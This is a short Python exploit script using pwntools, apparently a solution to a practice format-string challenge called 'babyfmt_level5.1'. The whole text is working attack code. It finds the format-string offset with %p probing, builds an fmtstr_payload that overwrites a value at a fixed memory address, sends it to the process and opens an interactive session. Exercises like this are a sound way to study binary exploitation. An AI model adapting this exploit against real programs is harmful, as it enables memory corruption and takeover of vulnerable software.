from pwn import *

context(arch="amd64", os="linux", log_level="info")

io = process("./babyfmt_level5.1")

target_addr = 0x404150
data = 0xF276D86975D01656
# payload = b"B" * 8 + b".%p" * 29 offset: 29
payload = fmtstr_payload(29, {target_addr: data})
io.recvuntil(b"Send your data!")
io.send(payload)
io.interactive()
